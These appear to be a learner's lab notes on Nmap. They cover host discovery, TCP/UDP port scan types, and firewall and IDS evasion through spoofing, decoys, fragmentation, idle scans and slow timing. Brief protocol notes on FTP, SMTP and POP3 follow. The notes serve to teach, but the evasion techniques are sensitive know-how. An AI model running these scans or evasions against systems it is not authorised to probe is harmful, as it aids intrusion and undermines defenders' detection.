ARP scan is possible only if you are on the same subnet as the target systems. On an Ethernet (802.3) and WiFi (802.11), you need to know the MAC address of any system before you can communicate with it. The MAC address is necessary for the link-layer header; the header contains the source MAC address and the destination MAC address among other fields. To get the MAC address, the OS sends an ARP query. A host that replies to ARP queries is up. The ARP query only works if the target is on the same subnet as yourself, i.e., on the same Ethernet/WiFi. You should expect to see many ARP queries generated during a Nmap scan of a local network. If you want Nmap only to perform an ARP scan without port-scanning, you can use nmap -PR -sn TARGETS, where -PR indicates that you only want an ARP scan. The following example shows Nmap using ARP for host discovery without any port scanning. We run nmap -PR -sn MACHINE_IP/24 to discover all the live systems on the same subnet as our target machine.

nmap -PR -sn 10.10.223.163/24

arp-scan --localnet OR arp-scan -l 
arp-scan -I eth0 -l
-=-=-=-=-=--=-=-=-=-=
Host Discovery using ICMP
To use ICMP echo request to discover live hosts, add the option -PE. (Remember to add -sn if you don’t want to follow that with a port scan.) As shown in the following figure, an ICMP echo scan works by sending an ICMP echo request and expects the target to reply with an ICMP echo reply if it is online.

#ICMP Echo
nmap -PE -sn 10.10.223.163/24
###The scan output shows that eight hosts are up; moreover, it shows their MAC addresses. Generally speaking, we don’t expect to learn the MAC addresses of the targets unless they are on the same subnet as our system. The output above indicates that Nmap didn’t need to send ICMP packets as it confirmed that these hosts are up based on the ARP responses it received.###

Because ICMP echo requests tend to be blocked, you might also consider ICMP Timestamp or ICMP Address Mask requests to tell if a system is online. Nmap uses timestamp request (ICMP Type 13) and checks whether it will get a Timestamp reply (ICMP Type 14). Adding the -PP option tells Nmap to use ICMP timestamp requests.

#ICMP Timestamp
nmap -PP -sn 10.10.223.163/24

Similarly, Nmap uses address mask queries (ICMP Type 17) and checks whether it gets an address mask reply (ICMP Type 18). This scan can be enabled with the option -PM.
#ICMP Address Mask
nmap -PM -sn 10.10.223.163/24
-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=
Host Discovery using TCP and UDP
If you want Nmap to use TCP SYN ping, you can do so via the option -PS followed by the port number, range, list, or a combination of them. For example, -PS21 will target port 21, while -PS21-25 will target ports 21, 22, 23, 24, and 25. Finally -PS80,443,8080 will target the three ports 80, 443, and 8080.

Privileged users (root and sudoers) can send TCP SYN packets and don’t need to complete the TCP 3-way handshake even if the port is open, as shown in the figure below. Unprivileged users have no choice but to complete the 3-way handshake if the port is open.

#TCP SYN ping
nmap -PS -sn MACHINE_IP/24 
#Technically speaking, since we didn’t specify any TCP ports to use in the TCP ping scan, Nmap used common ports; in this case, it is TCP port 80. Any service listening on port 80 is expected to reply, indirectly indicating that the host is online.


TCP ACK Ping

As you have guessed, this sends a packet with an ACK flag set. You must be running Nmap as a privileged user to be able to accomplish this. If you try it as an unprivileged user, Nmap will attempt a 3-way handshake.

By default, port 80 is used. The syntax is similar to TCP SYN ping. -PA should be followed by a port number, range, list, or a combination of them. For example, consider -PA21, -PA21-25 and -PA80,443,8080. If no port is specified, port 80 will be used.

The following figure shows that any TCP packet with an ACK flag should get a TCP packet back with an RST flag set. The target responds with the RST flag set because the TCP packet with the ACK flag is not part of any ongoing connection. The expected response is used to detect if the target host is up.

In this example, we run sudo nmap -PA -sn MACHINE_IP/24 to discover the online hosts on the target’s subnet

-=-=-=-=
UDP Ping

Finally, we can use UDP to discover if the host is online. Contrary to TCP SYN ping, sending a UDP packet to an open port is not expected to lead to any reply. However, if we send a UDP packet to a closed UDP port, we expect to get an ICMP port unreachable packet; this indicates that the target system is up and available.

In the following figure, we see a UDP packet sent to an open UDP port and not triggering any response. However, sending a UDP packet to any closed UDP port can trigger a response indirectly indicating that the target is online.

The syntax to specify the ports is similar to that of TCP SYN ping and TCP ACK ping; Nmap uses -PU for UDP ping.

-=-=-==-
Masscan
However, to finish its network scan quickly, Masscan is quite aggressive with the rate of packets it generates. The syntax is quite similar: -p can be followed by a port number, list, or range. Consider the following examples:

    masscan MACHINE_IP/24 -p443
    masscan MACHINE_IP/24 -p80,443
    masscan MACHINE_IP/24 -p22-25
    masscan MACHINE_IP/24 ‐‐top-ports 100

-=-==-=-=-=-=-=-=-
Using reverse-dns lookup 
Nmap’s default behaviour is to use reverse-DNS online hosts. Because the hostnames can reveal a lot, this can be a helpful step. However, if you don’t want to send such DNS queries, you use -n to skip this step.

By default, Nmap will look up online hosts; however, you can use the option -R to query the DNS server even for offline hosts. If you want to use a specific DNS server, you can add the --dns-servers DNS_SERVER option


SUMMARY
Scan Type 	        Example Command
ARP Scan 	        sudo nmap -PR -sn MACHINE_IP/24
ICMP Echo Scan 	        sudo nmap -PE -sn MACHINE_IP/24
ICMP Timestamp Scan 	sudo nmap -PP -sn MACHINE_IP/24
ICMP Address Mask Scan 	sudo nmap -PM -sn MACHINE_IP/24
TCP SYN Ping Scan 	sudo nmap -PS22,80,443 -sn MACHINE_IP/30
TCP ACK Ping Scan 	sudo nmap -PA22,80,443 -sn MACHINE_IP/30
UDP Ping Scan 	        sudo nmap -PU53,161,162 -sn MACHINE_IP/30

Remember to add -sn if you are only interested in host discovery without port-scanning. Omitting -sn will let Nmap default to port-scanning the live hosts.
Option 	Purpose
-n 	no DNS lookup
-R 	reverse-DNS lookup for all hosts
-sn 	host discovery only. Don't scan ports, just probe to see if the host exists
–traceroute: uses an existing probe method to do a full traceroute. Very clever way to map a network even when most stuff is shut down; if you can get a response from, say, ICMP timestamps you can use that to do the traceroute.



    -Pn: no discovery, just assume the host is up.
    -PS: TCP SYN. Tries to open a TCP port; getting back an ACK or RST will both confirm the host is online, so it works whether the port is open or not. Default is port 80, do “-PS99” or whatever to change the port number.
    -PA: TCP ACK. Sends a bogus ACK, expecting a RST back.
    -PU: UDP. Should get an ICMP port unreachable response.
    -PY: SCTP INIT. Similar to -PS, but tries to open an SCTP connection.
    -PE: ICMP echo. Good ol ping
    -PP: ICMP timestamp. One of those tech dead ends that should be removed or disabled (indeed, it’s not present in IPv6). My Linux server seems to respond with the correct time!
    -PM: ICMP address mask. A way to query the subnet mask. Kind of a useful thing really, but Linux doesn’t seem to answer it. Maybe disabled for security?
    -PO: IP protocol ping. Sends unusual IP protocol requests; ICMP, IGMP, and IP-in-IP by default. My Linux datacenter box doesn’t respond to IGMP or IP-in-IP probes.
    -PR: ARP ping. For local ethernets only, bypasses the kernel’s ARP handling and handles ARP itself.  Any ARP reply implies the host exists. Note this is on by default for local networks and short-circuits other types of requests.
-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
Scanning ports with NMAP
Nmap considers the following six states:

    Open: indicates that a service is listening on the specified port.
    Closed: indicates that no service is listening on the specified port, although the port is accessible. By accessible, we mean that it is reachable and is not blocked by a firewall or other security appliances/programs.
    Filtered: means that Nmap cannot determine if the port is open or closed because the port is not accessible. This state is usually due to a firewall preventing Nmap from reaching that port. Nmap’s packets may be blocked from reaching the port; alternatively, the responses are blocked from reaching Nmap’s host.
    Unfiltered: means that Nmap cannot determine if the port is open or closed, although the port is accessible. This state is encountered when using an ACK scan -sA.
    Open|Filtered: This means that Nmap cannot determine whether the port is open or filtered.
    Closed|Filtered: This means that Nmap cannot decide whether a port is closed or filtered.


-=-=-=
TCP flags in the TCP header
Setting a flag bit means setting its value to 1. From left to right, the TCP header flags are:

    URG: Urgent flag indicates that the urgent pointer filed is significant. The urgent pointer indicates that the incoming data is urgent, and that a TCP segment with the URG flag set is processed immediately without consideration of having to wait on previously sent TCP segments.
    ACK: Acknowledgement flag indicates that the acknowledgement number is significant. It is used to acknowledge the receipt of a TCP segment.
    PSH: Push flag asking TCP to pass the data to the application promptly.
    RST: Reset flag is used to reset the connection. Another device, such as a firewall, might send it to tear a TCP connection. This flag is also used when data is sent to a host and there is no service on the receiving end to answer.
    SYN: Synchronize flag is used to initiate a TCP 3-way handshake and synchronize sequence numbers with the other host. The sequence number should be set randomly during TCP connection establishment.
    FIN: The sender has no more data to send.

-=-=-=-
TCP connect scan
We are interested in learning whether the TCP port is open, not establishing a TCP connection. Hence the connection is torn as soon as its state is confirmed by sending a RST/ACK. You can choose to run TCP connect scan using -sT. It is important to note that if you are not a privileged user (root or sudoer), a TCP connect scan is the only possible option to discover open TCP ports.  A closed TCP port responds to a SYN packet with RST/ACK to indicate that it is not open
-sT 

SYN>
<SYN,ACK 
ACK>
RST,ACK>

Note that we can use -F to enable fast mode and decrease the number of scanned ports from 1000 to 100 most common ports.

It is worth mentioning that the -r option can also be added to scan the ports in consecutive order instead of random order. This option is useful when testing whether ports open in a consistent manner, for instance, when a target boots up
-=-=-=-==-
TCP SYN Scan 
Unprivileged users are limited to connect scan. However, the default scan mode is SYN scan, and it requires a privileged (root or sudoer) user to run it. SYN scan does not need to complete the TCP 3-way handshake; instead, it tears down the connection once it receives a response from the server. Because we didn’t establish a TCP connection, this decreases the chances of the scan being logged. We can select this scan type by using the -sS option

We can see a TCP connect scan -sT traffic. Any open TCP port will require Nmap to complete the TCP 3-way handshake before closing the connection. In the lower half of the following figure, we see how a SYN scan -sS does not need to complete the TCP 3-way handshake; instead, Nmap sends an RST packet once a SYN/ACK packet is received.

TCP SYN scan is the default scan mode when running Nmap as a privileged user, running as root or using sudo, and it is a very reliable choice

-=-=-=-=-=
UDP Scan 
UDP is a connectionless protocol, and hence it does not require any handshake for connection establishment. We cannot guarantee that a service listening on a UDP port would respond to our packets. However, if a UDP packet is sent to a closed port, an ICMP port unreachable error (type 3, code 3) is returned. You can select UDP scan using the -sU option; moreover, you can combine it with another TCP scan.

The following figure shows that if we send a UDP packet to an open UDP port, we cannot expect any reply in return. Therefore, sending a UDP packet to an open port won’t tell us anything.

However, as shown in the figure below, we expect to get an ICMP packet of type 3, destination unreachable, and code 3, port unreachable. In other words, the UDP ports that don’t generate any response are the ones that Nmap will state as open.
-=-=-=-=-
Fine tuning 


You can specify the ports you want to scan instead of the default 1000 ports. Specifying the ports is intuitive by now. Let’s see some examples:

    port list: -p22,80,443 will scan ports 22, 80 and 443.
    port range: -p1-1023 will scan all ports between 1 and 1023 inclusive, while -p20-25 will scan ports between 20 and 25 inclusive.

You can request the scan of all ports by using -p-, which will scan all 65535 ports. If you want to scan the most common 100 ports, add -F. Using --top-ports 10 will check the ten most common ports.

You can control the scan timing using -T<0-5>. -T0 is the slowest (paranoid), while -T5 is the fastest. According to Nmap manual page, there are six templates:

    paranoid (0)
    sneaky (1)
    polite (2)
    normal (3)
    aggressive (4)
    insane (5)

To avoid IDS alerts, you might consider -T0 or -T1. For instance, -T0 scans one port at a time and waits 5 minutes between sending each probe, so you can guess how long scanning one target would take to finish. If you don’t specify any timing, Nmap uses normal -T3. Note that -T5 is the most aggressive in terms of speed; however, this can affect the accuracy of the scan results due to the increased likelihood of packet loss. Note that -T4 is often used during CTFs and when learning to scan on practice targets, whereas -T1 is often used during real engagements where stealth is more important.

Alternatively, you can choose to control the packet rate using --min-rate <number> and --max-rate <number>. For example, --max-rate 10 or --max-rate=10 ensures that your scanner is not sending more than ten packets per second.

Moreover, you can control probing parallelization using --min-parallelism <numprobes> and --max-parallelism <numprobes>. Nmap probes the targets to discover which hosts are live and which ports are open; probing parallelization specifies the number of such probes that can be run in parallel. For instance, --min-parallelism=512 pushes Nmap to maintain at least 512 probes in parallel; these 512 probes are related to host discovery and open ports.

-=-=
Summary 
This room covered three types of scans.
Port Scan Type 	        Example Command
TCP Connect Scan 	nmap -sT MACHINE_IP
TCP SYN Scan 	        sudo nmap -sS MACHINE_IP
UDP Scan 	        sudo nmap -sU MACHINE_IP

These scan types should get you started discovering running TCP and UDP services on a target host.
Option 	        Purpose
-p- 	        all ports
-p1-1023 	scan ports 1 to 1023
-F 	        100 most common ports
-r 	        scan ports in consecutive order
-T<0-5> 	-T0 being the slowest and T5 the fastest
--max-rate 50 	rate <= 50 packets/sec
--min-rate 15 	rate >= 15 packets/sec
--min-parallelism 100 	at least 100 probes in parallel
-=-=-=-=-=-=-=-
NMAP advanced port scans


Let’s start with the following three types of scans:

    Null Scan
    FIN Scan
    Xmas Scan


TCP Null Scan

The null scan does not set any flag; all six flag bits are set to zero. You can choose this scan using the -sN option. A TCP packet with no flags set will not trigger any response when it reaches an open port, as shown in the figure below. Therefore, from Nmap’s perspective, a lack of reply in a null scan indicates that either the port is open or a firewall is blocking the packet.

However, we expect the target server to respond with an RST packet if the port is closed. Consequently, we can use the lack of RST response to figure out the ports that are not closed: open or filtered
 Because the null scan relies on the lack of a response to infer that the port is not closed, it cannot indicate with certainty that these ports are open; there is a possibility that the ports are not responding due to a firewall rule.

-=-=
TCP FIN Scan

The FIN scan sends a TCP packet with the FIN flag set. You can choose this scan type using the -sF option. Similarly, no response will be sent if the TCP port is open. Again, Nmap cannot be sure if the port is open or if a firewall is blocking the traffic related to this TCP port.

However, the target system should respond with an RST if the port is closed. Consequently, we will be able to know which ports are closed and use this knowledge to infer the ports that are open or filtered. It's worth noting some firewalls will 'silently' drop the traffic without sending an RST.

-=-=-=-
TCP Xmas Scan

The Xmas scan gets its name after Christmas tree lights. An Xmas scan sets the FIN, PSH, and URG flags simultaneously. You can select Xmas scan with the option -sX.

Like the Null scan and FIN scan, if an RST packet is received, it means that the port is closed. Otherwise, it will be reported as open|filtered.


On scenario where these three scan types can be efficient is when scanning a target behind a stateless (non-stateful) firewall. A stateless firewall will check if the incoming packet has the SYN flag set to detect a connection attempt. Using a flag combination that does not match the SYN packet makes it possible to deceive the firewall and reach the system behind it. However, a stateful firewall will practically block all such crafted packets and render this kind of scan useless.

-=-=-=
TCP Maimon scan
In this scan, the FIN and ACK bits are set. The target should send an RST packet as a response. However, certain BSD-derived systems drop the packet if it is an open port exposing the open ports. This scan won’t work on most targets encountered in modern networks; however, we include it in this room to better understand the port scanning mechanism and the hacking mindset. To select this scan type, use the -sM option.

Most target systems respond with an RST packet regardless of whether the TCP port is open. In such a case, we won’t be able to discover the open ports. The figure below shows the expected behaviour in the cases of both open and closed TCP ports
As mentioned, because open ports and closed ports are behaving the same way, the Maimon scan could not discover any open ports on the target system.
This type of scan is not the first scan one would pick to discover a system; however, it is important to know about it as you don’t know when it could come in handy

-=-=-=-=-=-=-=-
This task will cover how to perform a TCP ACK scan, a TCP window scan, and how to create your custom flag scan.

TCP ACK Scan

Let’s start with the TCP ACK scan. As the name implies, an ACK scan will send a TCP packet with the ACK flag set. Use the -sA option to choose this scan. As we show in the figure below, the target would respond to the ACK with RST regardless of the state of the port. This behaviour happens because a TCP packet with the ACK flag set should be sent only in response to a received TCP packet to acknowledge the receipt of some data, unlike our case. Hence, this scan won’t tell us whether the target port is open in a simple setup.

This kind of scan would be helpful if there is a firewall in front of the target. Consequently, based on which ACK packets resulted in responses, you will learn which ports were not blocked by the firewall. In other words, this type of scan is more suitable to discover firewall rule sets and configuration.

After setting up the target VM 10.10.255.227 with a firewall, we repeated the ACK scan. This time, we received some interesting results. As seen in the console output below, we have three ports that aren't being blocked by the firewall. This result indicates that the firewall is blocking all other ports except for these three ports.



Window Scan

Another similar scan is the TCP window scan. The TCP window scan is almost the same as the ACK scan; however, it examines the TCP Window field of the RST packets returned. On specific systems, this can reveal that the port is open. You can select this scan type with the option -sW. As shown in the figure below, we expect to get an RST packet in reply to our “uninvited” ACK packets, regardless of whether the port is open or closed.

However, as you would expect, if we repeat our TCP window scan against a server behind a firewall, we expect to get more satisfying results. In the console output shown below, the TCP window scan pointed that three ports are detected as closed. (This is in contrast with the ACK scan that labelled the same three ports as unfiltered.) Although we know that these three ports are not closed, we realize they responded differently, indicating that the firewall does not block them.


Custom Scan

If you want to experiment with a new TCP flag combination beyond the built-in TCP scan types, you can do so using --scanflags. For instance, if you want to set SYN, RST, and FIN simultaneously, you can do so using --scanflags RSTSYNFIN. As shown in the figure below, if you develop your custom scan, you need to know how the different ports will behave to interpret the results in different scenarios correctly.

Finally, it is essential to note that the ACK scan and the window scan were very efficient at helping us map out the firewall rules. However, it is vital to remember that just because a firewall is not blocking a specific port, it does not necessarily mean that a service is listening on that port. For example, there is a possibility that the firewall rules need to be updated to reflect recent service changes. Hence, ACK and window scans are exposing the firewall rules, not the services.

-=-=-=-=-=-
Spoofing and Decoys 

n some network setups, you will be able to scan a target system using a spoofed IP address and even a spoofed MAC address. Such a scan is only beneficial in a situation where you can guarantee to capture the response. If you try to scan a target from some random network using a spoofed IP address, chances are you won’t have any response routed to you, and the scan results could be unreliable.

The following figure shows the attacker launching the command nmap -S SPOOFED_IP 10.10.255.227. Consequently, Nmap will craft all the packets using the provided source IP address SPOOFED_IP. The target machine will respond to the incoming packets sending the replies to the destination IP address SPOOFED_IP. For this scan to work and give accurate results, the attacker needs to monitor the network traffic to analyze the replies.


In brief, scanning with a spoofed IP address is three steps:

    Attacker sends a packet with a spoofed source IP address to the target machine.
    Target machine replies to the spoofed IP address as the destination.
    Attacker captures the replies to figure out open ports.

In general, you expect to specify the network interface using -e and to explicitly disable ping scan -Pn. Therefore, instead of nmap -S SPOOFED_IP 10.10.255.227, you will need to issue nmap -e NET_INTERFACE -Pn -S SPOOFED_IP 10.10.255.227 to tell Nmap explicitly which network interface to use and not to expect to receive a ping reply. It is worth repeating that this scan will be useless if the attacker system cannot monitor the network for responses.

When you are on the same subnet as the target machine, you would be able to spoof your MAC address as well. You can specify the source MAC address using --spoof-mac SPOOFED_MAC. This address spoofing is only possible if the attacker and the target machine are on the same Ethernet (802.3) network or same WiFi (802.11).

Spoofing only works in a minimal number of cases where certain conditions are met. Therefore, the attacker might resort to using decoys to make it more challenging to be pinpointed. The concept is simple, make the scan appears to be coming from many IP addresses so that the attacker’s IP address would be lost among them. As we see in the figure below, the scan of the target machine will appear to be coming from 3 different sources, and consequently, the replies will go the decoys as well.

You can launch a decoy scan by specifying a specific or random IP address after -D. For example, nmap -D 10.10.0.1,10.10.0.2,ME 10.10.255.227 will make the scan of 10.10.255.227 appear as coming from the IP addresses 10.10.0.1, 10.10.0.2, and then ME to indicate that your IP address should appear in the third order. Another example command would be nmap -D 10.10.0.1,10.10.0.2,RND,RND,ME 10.10.255.227, where the third and fourth source IP addresses are assigned randomly, while the fifth source is going to be the attacker’s IP address. In other words, each time you execute the latter command, you would expect two new random IP addresses to be the third and fourth decoy sources.


-=-=-=-=
Fragmented packets

Firewall

A firewall is a piece of software or hardware that permits packets to pass through or blocks them. It functions based on firewall rules, summarized as blocking all traffic with exceptions or allowing all traffic with exceptions. For instance, you might block all traffic to your server except those coming to your web server. A traditional firewall inspects, at least, the IP header and the transport layer header. A more sophisticated firewall would also try to examine the data carried by the transport layer.

IDS

An intrusion detection system (IDS) inspects network packets for select behavioural patterns or specific content signatures. It raises an alert whenever a malicious rule is met. In addition to the IP header and transport layer header, an IDS would inspect the data contents in the transport layer and check if it matches any malicious patterns. How can you make it less likely for a traditional firewall/IDS to detect your Nmap activity? It is not easy to answer this; however, depending on the type of firewall/IDS, you might benefit from dividing the packet into smaller packets.

Fragmented Packets

Nmap provides the option -f to fragment packets. Once chosen, the IP data will be divided into 8 bytes or less. Adding another -f (-f -f or -ff) will split the data into 16 byte-fragments instead of 8. You can change the default value by using the --mtu; however, you should always choose a multiple of 8.

To properly understand fragmentation, we need to look at the IP header in the figure below. It might look complicated at first, but we notice that we know most of its fields. In particular, notice the source address taking 32 bits (4 bytes) on the fourth row, while the destination address is taking another 4 bytes on the fifth row. The data that we will fragment across multiple packets is highlighted in red. To aid in the reassembly on the recipient side, IP uses the identification (ID) and fragment offset, shown on the second row of the figure below.


Let’s compare running sudo nmap -sS -p80 10.20.30.144 and sudo nmap -sS -p80 -f 10.20.30.144. As you know by now, this will use stealth TCP SYN scan on port 80; however, in the second command, we are requesting Nmap to fragment the IP packets.

In the first two lines, we can see an ARP query and response. Nmap issued an ARP query because the target is on the same Ethernet. The second two lines show a TCP SYN ping and a reply. The fifth line is the beginning of the port scan; Nmap sends a TCP SYN packet to port 80. In this case, the IP header is 20 bytes, and the TCP header is 24 bytes. Note that the minimum size of the TCP header is 20 bytes.

With fragmentation requested via -f, the 24 bytes of the TCP header will be divided into multiples of 8 bytes, with the last fragment containing 8 bytes or less of the TCP header. Since 24 is divisible by 8, we got 3 IP fragments; each has 20 bytes of IP header and 8 bytes of TCP header. We can see the three fragments between the fifth and the seventh lines.

Note that if you added -ff (or -f -f), the fragmentation of the data will be multiples of 16. In other words, the 24 bytes of the TCP header, in this case, would be divided over two IP fragments, the first containing 16 bytes and the second containing 8 bytes of the TCP header.

On the other hand, if you prefer to increase the size of your packets to make them look innocuous, you can use the option --data-length NUM, where num specifies the number of bytes you want to append to your packets.
-=-=-=-=-
Idle/Zombie Scan 
Spoofing the source IP address can be a great approach to scanning stealthily. However, spoofing will only work in specific network setups. It requires you to be in a position where you can monitor the traffic. Considering these limitations, spoofing your IP address can have little use; however, we can give it an upgrade with the idle scan.

The idle scan, or zombie scan, requires an idle system connected to the network that you can communicate with. Practically, Nmap will make each probe appear as if coming from the idle (zombie) host, then it will check for indicators whether the idle (zombie) host received any response to the spoofed probe. This is accomplished by checking the IP identification (IP ID) value in the IP header. You can run an idle scan using nmap -sI ZOMBIE_IP 10.10.148.44, where ZOMBIE_IP is the IP address of the idle host (zombie).

The idle (zombie) scan requires the following three steps to discover whether a port is open:

    Trigger the idle host to respond so that you can record the current IP ID on the idle host.
    Send a SYN packet to a TCP port on the target. The packet should be spoofed to appear as if it was coming from the idle host (zombie) IP address.
    Trigger the idle machine again to respond so that you can compare the new IP ID with the one received earlier.

Let’s explain with figures. In the figure below, we have the attacker system probing an idle machine, a multi-function printer. By sending a SYN/ACK, it responds with an RST packet containing its newly incremented IP ID.

1. The attacker will send a SYN packet to the TCP port they want to check on the target machine in the next step. However, this packet will use the idle host (zombie) IP address as the source. Three scenarios would arise. In the first scenario, shown in the figure below, the TCP port is closed; therefore, the target machine responds to the idle host with an RST packet. The idle host does not respond; hence its IP ID is not incremented.

2. In the second scenario, as shown below, the TCP port is open, so the target machine responds with a SYN/ACK to the idle host (zombie). The idle host responds to this unexpected packet with an RST packet, thus incrementing its IP ID.

3. In the third scenario, the target machine does not respond at all due to firewall rules. This lack of response will lead to the same result as with the closed port; the idle host won’t increase the IP ID.

For the final step, the attacker sends another SYN/ACK to the idle host. The idle host responds with an RST packet, incrementing the IP ID by one again. The attacker needs to compare the IP ID of the RST packet received in the first step with the IP ID of the RST packet received in this third step. If the difference is 1, it means the port on the target machine was closed or filtered. However, if the difference is 2, it means that the port on the target was open.

It is worth repeating that this scan is called an idle scan because choosing an idle host is indispensable for the accuracy of the scan. If the “idle host” is busy, all the returned IP IDs would be useless.
-=-=-=-
Getting more details

--reason 
-vvv
-dd 

-=-=-=
Summary
This room covered the following types of scans.
Port Scan Type 	             Example Command
TCP Null Scan 	             sudo nmap -sN 10.10.3.241
TCP FIN Scan 	             sudo nmap -sF 10.10.3.241
TCP Xmas Scan 	             sudo nmap -sX 10.10.3.241
TCP Maimon Scan              sudo nmap -sM 10.10.3.241
TCP ACK Scan 	             sudo nmap -sA 10.10.3.241
TCP Window Scan              sudo nmap -sW 10.10.3.241
Custom TCP Scan              sudo nmap --scanflags URGACKPSHRSTSYNFIN 10.10.3.241
Spoofed Source IP            sudo nmap -S SPOOFED_IP 10.10.3.241
Spoofed MAC Address          --spoof-mac SPOOFED_MAC
Decoy Scan 	             nmap -D DECOY_IP,ME 10.10.3.241
Idle (Zombie) Scan           sudo nmap -sI ZOMBIE_IP 10.10.3.241
Fragment IP data into 8 bytes 	-f
Fragment IP data into 16 bytes 	-ff
Option 	Purpose

--source-port PORT_NUM
	specify source port number

--data-length NUM
	append random data to reach given length

These scan types rely on setting TCP flags in unexpected ways to prompt ports for a reply. Null, FIN, and Xmas scan provoke a response from closed ports, while Maimon, ACK, and Window scans provoke a response from open and closed ports.
Option 	Purpose
--reason 	explains how Nmap made its conclusion
-v 	verbose
-vv 	very verbose
-d 	debugging
-dd 	more details for debugging
-=-=-=-=-=-==-=
Service Detection

Adding -sV to your Nmap command will collect and determine service and version information for the open ports. You can control the intensity with --version-intensity LEVEL where the level ranges between 0, the lightest, and 9, the most complete. -sV --version-light has an intensity of 2, while -sV --version-all has an intensity of 9.

It is important to note that using -sV will force Nmap to proceed with the TCP 3-way handshake and establish the connection. The connection establishment is necessary because Nmap cannot discover the version without establishing a connection fully and communicating with the listening service. In other words, stealth SYN scan -sS is not possible when -sV option is chosen.

-=-=-=
OS detection and traceroute 
-O 
The OS detection is very convenient, but many factors might affect its accuracy. First and foremost, Nmap needs to find at least one open and one closed port on the target to make a reliable guess. Furthermore, the guest OS fingerprints might get distorted due to the rising use of virtualization and similar technologies. Therefore, always take the OS version with a grain of salt.

Traceroute

If you want Nmap to find the routers between you and the target, just add --traceroute. In the following example, Nmap appended a traceroute to its scan results. Note that Nmap’s traceroute works slightly different than the traceroute command found on Linux and macOS or tracert found on MS Windows. Standard traceroute starts with a packet of low TTL (Time to Live) and keeps increasing until it reaches the target. Nmap’s traceroute starts with a packet of high TTL and keeps decreasing it.

t is worth mentioning that many routers are configured not to send ICMP Time-to-Live exceeded, which would prevent us from discovering their IP addresses

-=-=-=
Nmap scripting engine (NSE)

You can specify to use any or a group of these installed scripts; moreover, you can install other user’s scripts and use them for your scans. Let’s begin with the default scripts. You can choose to run the scripts in the default category using --script=default or simply adding -sC. In addition to default, categories include auth, broadcast, brute, default, discovery, dos, exploit, external, fuzzer, intrusive, malware, safe, version, and vuln. A brief description is shown in the following table.
Script Category 	Description
auth 	                Authentication related scripts
broadcast 	        Discover hosts by sending broadcast messages
brute 	                Performs brute-force password auditing against logins
default 	        Default scripts, same as -sC
discovery 	        Retrieve accessible information, such as database tables and DNS names
dos 	                Detects servers vulnerable to Denial of Service (DoS)
exploit 	        Attempts to exploit various vulnerable services
external 	        Checks using a third-party service, such as Geoplugin and Virustotal
fuzzer 	                Launch fuzzing attacks
intrusive 	        Intrusive scripts such as brute-force attacks and exploitation
malware 	        Scans for backdoors
safe 	                Safe scripts that won’t crash the target
version 	        Retrieve service versions
vuln 	                Checks for vulnerabilities or exploit vulnerable services

=-=-=-
Option 	Meaning
-sV 	determine service/version info on open ports
-sV --version-light 	try the most likely probes (2)
-sV --version-all 	try all available probes (9)
-O 	detect OS
--traceroute 	run traceroute to target
--script=SCRIPTS 	Nmap scripts to run
-sC or --script=default 	run default scripts
-A 	equivalent to -sV -O -sC --traceroute
-oN 	save output in normal format
-oG 	save output in grepable format
-oX 	save output in XML format
-oA 	save output in normal, XML and Grepable formats
-=-=-=-=-=-=
Protocols and servers 

The $ indicates that this is not a root terminal.
FTP
A command like STAT can provide some added information. The SYST command shows the System Type of the target (UNIX in this case). PASV switches the mode to passive. It is worth noting that there are two modes for FTP:

    Active: In the active mode, the data is sent over a separate channel originating from the FTP server’s port 20.
    Passive: In the passive mode, the data is sent over a separate channel originating from an FTP client’s port above port number 1023.

The command TYPE A switches the file transfer mode to ASCII, while TYPE I switches the file transfer mode to binary. However, we cannot transfer a file using a simple client such as Telnet because FTP creates a separate connection for file transfer.

FTP could be secured using SSL/TLS by using the FTPS protocol which uses port 990. It is worth mentioning that FTP can also be secured using the SSH protocol which is the SFTP protocol. By default this service listens on port 22, just like SSH

FTPS uses multiple ports and needs a secondary data channel which makes using firewalls more difficult. On the other hand, SFTP uses a single connection between the client and the server and so it is more firewall-friendly
-=-=
#STMP
Email delivery over the Internet requires the following components:

    Mail Submission Agent (MSA)
    Mail Transfer Agent (MTA)
    Mail Delivery Agent (MDA)
    Mail User Agent (MUA)


These are the following five steps that an email needs to go through to reach the recipient’s inbox:

    A Mail User Agent (MUA), or simply an email client, has an email message to be sent. The MUA connects to a Mail Submission Agent (MSA) to send its message.
    The MSA receives the message, checks for any errors before transferring it to the Mail Transfer Agent (MTA) server, commonly hosted on the same server.
    The MTA will send the email message to the MTA of the recipient. The MTA can also function as a Mail Submission Agent (MSA).
    A typical setup would have the MTA server also functioning as a Mail Delivery Agent (MDA).
    The recipient will collect its email from the MDA using their email client.

If the above steps sound confusing, consider the following analogy:

    You (MUA) want to send postal mail.
    The post office employee (MSA) checks the postal mail for any issues before your local post office (MTA) accepts it.
    The local post office checks the mail destination and sends it to the post office (MTA) in the correct country.
    The post office (MTA) delivers the mail to the recipient mailbox (MDA).
    The recipient (MUA) regularly checks the mailbox for new mail. They notice the new mail, and they take it.

In the same way, we need to follow a protocol to communicate with an HTTP server, and we need to rely on email protocols to talk with an MTA and an MDA. The protocols are:

    Simple Mail Transfer Protocol (SMTP)
    Post Office Protocol version 3 (POP3) or Internet Message Access Protocol (IMAP)

We explain SMTP in this task and elaborate on POP3 and IMAP in the following two tasks.

Simple Mail Transfer Protocol (SMTP) is used to communicate with an MTA server. Because SMTP uses cleartext, where all commands are sent without encryption, we can use a basic Telnet client to connect to an SMTP server and act as an email client (MUA) sending a message.

SMTP server listens on port 25 by default. To see basic communication with an SMTP server, we used Telnet to connect to it. Once connected, we issue helo hostname and then start typing our email.

After helo, we issue mail from:, rcpt to: to indicate the sender and the recipient. When we send our email message, we issue the command data and type our message. We issue <CR><LF>.<CR><LF> (or Enter . Enter to put it in simpler terms). The SMTP server now queues the message.

-=-=-=-=
POP3 

Post Office Protocol version 3 (POP3) is a protocol used to download the email messages from a Mail Delivery Agent (MDA) server, as shown in the figure below. The mail client connects to the POP3 server, authenticates, downloads the new email messages before (optionally) deleting them.

First, the user connects to the POP3 server at the POP3 default port 110. Authentication is required to access the email messages; the user authenticates by providing his username USER frank and password PASS D2xc9CgD. Using the command STAT, we get the reply +OK 1 179; based on RFC 1939, a positive response to STAT has the format +OK nn mm, where nn is the number of email messages in the inbox, and mm is the size of the inbox in octets (byte). The command LIST provided a list of new messages on the server, and RETR 1 retrieved the first message in the list. We don’t need to concern ourselves with memorizing these commands; however, it is helpful to strengthen our understanding of such protocol.


